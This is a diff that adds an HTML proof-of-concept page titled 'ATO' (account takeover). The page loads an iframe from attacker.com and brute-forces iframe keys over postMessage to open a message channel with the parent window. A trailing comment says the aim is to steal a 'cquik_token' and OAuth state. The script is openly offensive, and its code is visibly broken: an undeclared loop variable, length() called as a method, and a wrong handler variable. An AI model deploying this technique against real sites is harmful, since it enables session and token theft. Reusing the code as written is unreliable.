@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>ATO</title>
+</head>
+<body>
+		<iframe id="frame" sandbox="allow-scripts" src="https://attacker.com/messageChanel.html" frameborder="0"></iframe>
+		<script>
+			const frame = document.querySelector("#frame");
+			let brutelist = [];
+			let charset = ["0","1","2","3","4","5","6","7","8","9"];
+
+			for(let x=0;x<26;x++)
+            	charset.push(String.fromCharCode(x+97))
+
+			for(let x=0;x<charset.length;x++)
+			{
+				for(let i=0;i<charset.length;i++)
+				{
+					brutelist.push(charset[x]+charset[i]);
+				}
+			}
+
+			
+			function brute_force()
+			{
+				setInterval(() => {
+					if (i > brutelist.length())
+						return ;
+					let ifrm_name = "jsc_c_" + brutelist[i];
+					const channel = MessageChannel();
+					top.postMessage({compatAction:"CompatSetup",iframeKey:ifrm_name}, "*", [channel.port1]);
+					channel.port2.onmessage = (e) =>
+					{
+						alert(message.data.uri);
+					}
+					i++;
+				}, 10);
+			}
+			</script>
+</body>
+</html>
+
+<!-- 1. need to generate the iframe key
+     2. brute force it with iframe key to establish messaging
+	 3. get the cquik_token and the state
+-->
